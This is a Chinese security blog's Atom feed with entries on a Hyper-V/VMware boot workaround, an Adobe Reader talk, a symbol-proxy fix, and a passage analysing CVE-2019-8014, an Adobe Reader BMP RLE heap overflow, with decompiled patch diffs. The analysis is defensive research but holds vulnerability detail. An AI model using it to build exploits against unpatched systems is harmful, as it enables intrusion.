<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>程序人生</title>
  
  <subtitle>Fuzzing / Vulnerability / Exploit</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://programlife.net/"/>
  <updated>2020-05-10T09:15:32.000Z</updated>
  <id>http://programlife.net/</id>
  
  <author>
    <name>Ke Liu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VMware Workstation Incompatible with Device/Credential Guard</title>
    <link href="http://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/"/>
    <id>http://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/</id>
    <published>2020-05-10T00:13:37.000Z</published>
    <updated>2020-05-10T09:15:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>在 Windows 中启用 Hyper-V 之后，VMware Workstation 就不能用了，会提示“VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation”，然而禁用 Device/Credential Guard 并不能解决问题。</p><a id="more"></a><p><img src="/uploads/202005/vmware-workstation-incompatible-with-device-credential-guard.png" alt="VMware Workstation and Device/Credential Guard are not compatible"></p><p>启用 Hyper-V 之后，原来的宿主机操作系统实际上也变成了一台虚拟机，即宿主机操作系统是运行在 Hypervisor 之上的，此时再运行 VMware Workstation <strong><em>可能会产生嵌套虚拟化</em></strong>（此为猜测），而 Hyper-V 的虚拟机默认是没有开启嵌套虚拟化支持的。</p><p>一个可行的解决方法是通过 <code>bcdedit</code> 设置两套启动方案，一套启用 Hyper-V，另一套则禁用 Hyper-V（设置 <code>HypervisorLaunchType</code> 为 <code>OFF</code>）以便运行 VMware Workstation。</p><p><img src="/uploads/202005/bcdedit-hypervisor-launchtype.png" alt="通过 bcdedit 参数 HypervisorLaunchType 禁用 Hyper-V"></p><p>相关命令文本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> &#123;current&#125; description <span class="string">"Windows 10 Hyper-V"</span></span><br><span class="line">bcdedit /copy &#123;current&#125; /d <span class="string">"Winows 10"</span></span><br><span class="line"><span class="comment">// 已将该项成功复制到 &#123;new_guid&#125;</span></span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;new_guid&#125; HypervisorLaunchType OFF</span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;new_guid&#125;</span><br><span class="line">bcdedit /timeout <span class="number">10</span></span><br></pre></td></tr></table></figure><p>这里默认进入启用了 Hyper-V 的启动项，等待时间设置为 10 秒钟。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 Windows 中启用 Hyper-V 之后，VMware Workstation 就不能用了，会提示“VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation”，然而禁用 Device/Credential Guard 并不能解决问题。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="VMware Workstation" scheme="http://programlife.net/tags/VMware-Workstation/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
  </entry>
  
  <entry>
    <title>Pwning Adobe Reader Multiple Times with Malformed Strings</title>
    <link href="http://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/"/>
    <id>http://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/</id>
    <published>2020-04-29T00:13:37.000Z</published>
    <updated>2020-04-29T02:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>这次我在 HITB Lockdown Livestream 上发表了题为《<strong>Pwning Adobe Reader Multiple Times with Malformed Strings</strong>》的演讲，该演讲本来是为 HITB 2020 Amsterdam 准备的，但由于受疫情影响，主办方被迫取消了原来的会议安排，转而在 YouTube 上举办了一次免费的在线会议。</p><a id="more"></a><p>这次的议题是我在 ZeroNights 2019 上的演讲《<strong>Two Bytes to Rule Adobe Reader Twice: The Black Magic Behind the Byte Order Mark</strong>》的进一步研究，因此会有接近 40% 的内容是重复的。这次演讲精简了上一次演讲的内容，增加了对 Adobe JavaScript 引擎相关数据结构的分析，同时增加了 2 个新的可利用漏洞；最重要的是，这次我花了不少时间写了一篇非常详细的 Paper，方便感兴趣的同学自行开展漏洞分析工作。</p><p>值得一提的是，这次新增加的 2 个漏洞其实已经存了很久了，而距离上一次演讲已经过去了将近半年的时间，所以如果有人认真研究了我上一次演讲的内容的话，发现这 2 个漏洞也不是什么难事 :-)</p><p>议题文档：</p><ul><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_slides.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Slides</a></li><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_whitepaper.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Paper</a></li></ul><p><img src="/uploads/202004/hitb-livestream.png" alt="HITB Lockdown Livestream 演讲"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我在 HITB Lockdown Livestream 上发表了题为《&lt;strong&gt;Pwning Adobe Reader Multiple Times with Malformed Strings&lt;/strong&gt;》的演讲，该演讲本来是为 HITB 2020 Amsterdam 准备的，但由于受疫情影响，主办方被迫取消了原来的会议安排，转而在 YouTube 上举办了一次免费的在线会议。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="CVE-2019-7032" scheme="http://programlife.net/tags/CVE-2019-7032/"/>
    
      <category term="CVE-2019-8199" scheme="http://programlife.net/tags/CVE-2019-8199/"/>
    
      <category term="CVE-2020-3804" scheme="http://programlife.net/tags/CVE-2020-3804/"/>
    
      <category term="CVE-2020-3805" scheme="http://programlife.net/tags/CVE-2020-3805/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
  </entry>
  
  <entry>
    <title>Windows 调试符号下载代理配置</title>
    <link href="http://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/"/>
    <id>http://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/</id>
    <published>2020-02-23T00:13:37.000Z</published>
    <updated>2020-02-23T02:16:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 <code>E_PDB_NOT_FOUND</code>），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。</p><p><img src="/uploads/202002/ida-pro-pdb-not-found.png" alt="IDA Pro 无法下载 Notepad 的调试符号"></p><a id="more"></a><p>后来发现，这次是无法从微软的服务器下载任何调试符号，比如使用 WinDbg 自带的 <code>symchk.exe</code> 无法给 System32 目录下的任一文件下载调试符号，而且在不同的机器上（拥有不同的代理上网环境）均不能下载调试符号，这就非常奇怪了。</p><p>笔者在某不存在的社交网站上反应了这个问题，有网友表示需要使用 VPN，也有网友表示需要绕过长城，还有网友表示 VPN 也不解决问题，而国外友人则表示完全不存在这个问题！很显然，这跟国内复杂的网络环境不无关系！</p><p>笔者打开了 Wireshark，想看看从微软的服务器下载调试符号时到底发生了什么。比如，在给 Notepad 下载调试符号时，后台访问的 URL 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://msdl.microsoft.com/download/symbols/notepad.pdb/BC0D363AF49A0E2C05B06DA4535DA0C71/notepad.pdb</span><br></pre></td></tr></table></figure><p>接着会重定向到以下地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vsblobprodscussu5shard60.blob.core.windows.net/b-4712e0edc5a240eabf23330d7df68e77/F6311B221044787072987B74992D6DE770FCBBFED09C2853B4F10350CB964FF900.blob?sv=2017-04-17&amp;sr=b&amp;si=1&amp;sig=ulHtMVJpGWuEvNczzOR6J3g2rXS1s9qwwmEqJ1x63wg%3D&amp;spr=https&amp;se=2020-02-24T01%3A57%3A40Z&amp;rscl=x-e2eid-66439cf8-65874550-b9c5b293-e8bf7391-session-627c05ca-398743d1-b7a6ab61-b0fbc28f</span><br></pre></td></tr></table></figure><p>Chrome 提示 <code>ERR_CONNECTION_RESET</code> ，显然 <code>vsblobprodscussu5shard60.blob.core.windows.net</code> 被 Block 了。那为什么此时代理不管用了呢？而代理服务器本身是可以正常访问这个地址的，或者说，基于代理服务器上的 VPN 也可以正常访问这个地址。</p><p>后来发现，笔者使用的是 PAC 代理上网模式（<strong>Proxy Auto-Config</strong>，<a href="https://zh.wikipedia.org/zh-hans/%E4%BB%A3%E7%90%86%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE" target="_blank" rel="noopener">代理自动配置</a>），上网流量要不要经过代理服务器是根据 PAC 规则文件来定的（相对全局代理模式更加智能），而 <code>windows.net</code> 并没有出现在一些流行的 PAC 规则文件中，因此这里无法正常下载调试符号文件。</p><p>解决方案非常简单，给 PAC 规则文件增加一条记录 <code>.windows.net</code> ，表示支持 <code>windows.net</code> 下所有地址的访问。</p><p><img src="/uploads/202002/across-the-great-wall.png" alt="越过长城，走向世界"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 &lt;code&gt;E_PDB_NOT_FOUND&lt;/code&gt;），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/202002/ida-pro-pdb-not-found.png&quot; alt=&quot;IDA Pro 无法下载 Notepad 的调试符号&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
    
      <category term="WinDbg" scheme="http://programlife.net/tags/WinDbg/"/>
    
  </entry>
  
  <entry>
    <title>深入分析 Adobe 忽略了 6 年的 PDF 漏洞</title>
    <link href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/"/>
    <id>http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-cn/</id>
    <published>2019-09-12T00:13:37.000Z</published>
    <updated>2019-09-12T12:59:37.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 <strong><del>修复</del></strong> 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。</em></p><p>本文作者：<strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p><h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>Adobe 在八月份为 Adobe Acrobat and Reader 发布了安全公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> ，和往常一样，这次更新修复了大量漏洞。当笔者在 <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> 上查看对应的漏洞公告时，目光迅速被 <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> 所吸引，因为模块 <code>AcroForm</code> 中 Bitmap 解析相关的漏洞非常少见。该漏洞在 ZDI 上的部分公告信息如下：</p><a id="more"></a><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p><p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><p>看描述这和六年之前修复的漏洞 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> 非常相似——都和 <strong>XFA Bitmap Run Length Encoding</strong> 解析有关！实际上，两个漏洞之间确实有着千丝万缕的联系，本文将详细分析漏洞的原理以及两者之间的关系。</p><p>漏洞 CVE-2019-8014 在 ZDI 上的致谢信息为 <code>ktkitty (https://ktkitty.github.io)</code> 。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02. 环境搭建"></a>0x02. 环境搭建</h2><p>根据官方公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> 的描述，该漏洞影响 <code>2019.012.20035</code> 以及更早版本的 Adobe Acrobat and Reader ，而不受影响的最新版本号为 <code>2019.012.20036</code> 。本文基于前者进行漏洞分析、基于后者进行补丁分析。</p><p>安装 Adobe Acrobat Reader DC <code>2019.012.20035</code> 的步骤如下：</p><ol><li>下载并安装 <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">下载链接</a>)</li><li>升级到 <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">下载链接</a>)</li></ol><p>安装 Adobe Acrobat Reader DC <code>2019.012.20036</code> 的步骤如下：</p><ol><li>下载并安装 <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">下载链接</a>)</li></ol><p>在调试环境中安装好软件后，记得禁用更新服务 <em>Adobe Acrobat Update Service</em> 或者直接断开网络连接，防止 Adobe Acrobat Reader DC 自动更新。</p><h2 id="0x03-位图简介"><a href="#0x03-位图简介" class="headerlink" title="0x03. 位图简介"></a>0x03. 位图简介</h2><p>在进行漏洞分析之前，先简单介绍一下位图的结构。如果你对位图已经非常熟悉，那么可以直接跳过本小节内容。</p><h3 id="3-1-相关结构"><a href="#3-1-相关结构" class="headerlink" title="3.1 相关结构"></a>3.1 相关结构</h3><p>通常来说，位图文件由以下四部分构成：</p><ol><li>Bitmap File Header</li><li>Bitmap Info Header</li><li>RGBQUAD Array</li><li>Bitmap Data</li></ol><h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> 的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 文件标记 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// 位图文件的大小</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// 位图数据在文件中的偏移值</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> 的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// 结构体的大小</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// 位图宽度</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// 位图高度</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// 必须为 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// 每个像素所占用的位数</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// 压缩算法</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// 数据大小</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// 水平分辨率</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// 垂直分辨率</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// 色彩索引数</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// 必须的色彩索引数</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><p>这里成员 <code>biCompression</code> 指明了位图所使用的压缩算法，部分压缩算法的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// 未使用压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// RLE8 压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// RLE4 压缩算法</span></span></span><br><span class="line"><span class="comment">// 其他压缩算法...</span></span><br></pre></td></tr></table></figure><h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> 描述一个像素的色彩组成，其定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><p><strong>RGBQUAD Array</strong> 代表了一张色彩表，位图数据在解析之后可以是一个索引，索引在数组中对应的值便是该像素的色彩表示。该数组的长度取决于结构体 <strong>BITMAPINFOHEADER</strong> 中的 <code>biBitCount</code> 和 <code>biClrUsed</code> 成员的值。</p><h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>位图的位数据，该部分数据的表现形式取决于位图所使用的压缩算法。</p><p>有一点需要注意的是：位图数据是从左下角往右上角方向进行填充的，即位图数据中解析出来的第一个像素的色彩，应当填充到位图的左下角 [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)]，随后依次填充当前行的像素，当前行填充完毕之后，往上移动一个像素继续以行位单位进行填充，直到位图填充完毕。</p><h3 id="3-2-RLE-编码"><a href="#3-2-RLE-编码" class="headerlink" title="3.2 RLE 编码"></a>3.2 RLE 编码</h3><p>位图支持两种类型的 RLE（<strong>Run Length Encoding</strong>）压缩算法：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> 和 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> 。</p><h4 id="3-2-1-RLE8-编码"><a href="#3-2-1-RLE8-编码" class="headerlink" title="3.2.1 RLE8 编码"></a>3.2.1 RLE8 编码</h4><p>RLE8 压缩算法用于压缩 8 位位图（即每个像素占用 1 字节空间）。RLE8 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p><strong>编码模式</strong> 包含两字节数据：</p><ul><li>如果第一个字节不为零，其含义为第二个字节需要重复的次数</li><li>如果第一个字节为零，那么第二个字节的可能含义如下<ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的字节是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p><p>下面为 RLE8 压缩之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="3-2-2-RLE4-编码"><a href="#3-2-2-RLE4-编码" class="headerlink" title="3.2.2 RLE4 编码"></a>3.2.2 RLE4 编码</h4><p>RLE4 压缩算法用于压缩 4 位位图（即每个像素占用半字节空间）。RLE4 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p><strong>编码模式</strong> 包含两字节数据：</p><ul><li><p>如果第一个字节不为零，其含义为第二个字节展开后得到的像素个数</p><ul><li>第二个字节代表了两个像素的色彩索引</li><li>高 4 位代表第一个像素的色彩索引</li><li>低 4 位代表第二个像素的色彩索引</li><li>二者依次交替重复，直到得到第一个字节指定的像素个数</li></ul></li><li><p>如果第一个字节为零，那么第二个字节的可能含义如下</p><ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的 <strong>半字节</strong> 是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p><p>下面为 RLE4 压缩之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04. 漏洞分析"></a>0x04. 漏洞分析</h2><h3 id="4-1-代码定位"><a href="#4-1-代码定位" class="headerlink" title="4.1 代码定位"></a>4.1 代码定位</h3><p>根据 ZDI 网站上的公告信息，可知漏洞位于 <strong>AcroForm</strong> 模块。该模块是 Adobe Acrobat Reader DC 中负责处理 <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA 表单</a> 的插件，其路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure><p>通常来说，借助 <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> 进行补丁对比分析可以快速定位到有漏洞的函数，但如果新旧版本的二进制文件变动比较大的话就不太好处理了，模块 <code>AcroForm.api</code> 的情况便是如此：通过对比发现有大量函数进行了改动，一个一个去看显然不太现实。</p><p>笔者用于定位漏洞函数的方法如下（以 <code>2019.012.20035</code> 为例）：</p><ol><li>在 <code>IDA</code> 中搜索字符串 <code>PNG</code> ，在 <code>.rdata:20F9A374</code> 找到一处定义</li><li>对 <code>20F9A374</code> 进行交叉引用查找，定位到函数 <code>sub_20CF3A3F</code> </li><li>很显然函数 <code>sub_20CF3A3F</code> 负责判断图片的类型（从这里也可以看出 XFA 表单所支持的图片格式类型）</li><li>对 <code>sub_20CF3A3F</code> 进行交叉引用查找，定位到函数 <code>sub_20CF4BE8</code> </li><li>函数 <code>sub_20CF4BE8</code> 根据图片的类型调用不同的处理函数</li><li>函数 <code>sub_20CF4870</code>（跳转自 <code>sub_20CF3E5F</code>）负责处理 <code>BMP</code> 位图</li></ol><p>在 BinDiff 的结果中可以看到，函数 <code>sub_20CF3E5F</code> 中确实有几个基本块发生了变动，比如 <code>20CF440F</code> 处的基本块的变动情况如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>很明显，这里增加了对整数溢出的判断。</p><h3 id="4-2-漏洞分析"><a href="#4-2-漏洞分析" class="headerlink" title="4.2 漏洞分析"></a>4.2 漏洞分析</h3><p>好在网上已经有了针对 CVE-2013-2729 的详细分析报告（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a>），基于此可以快速理解函数 <code>sub_20CF3E5F</code> 中相关代码的含义。</p><h4 id="4-2-1-RLE8-解析"><a href="#4-2-1-RLE8-解析" class="headerlink" title="4.2.1 RLE8 解析"></a>4.2.1 RLE8 解析</h4><p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE8 压缩数据的部分代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 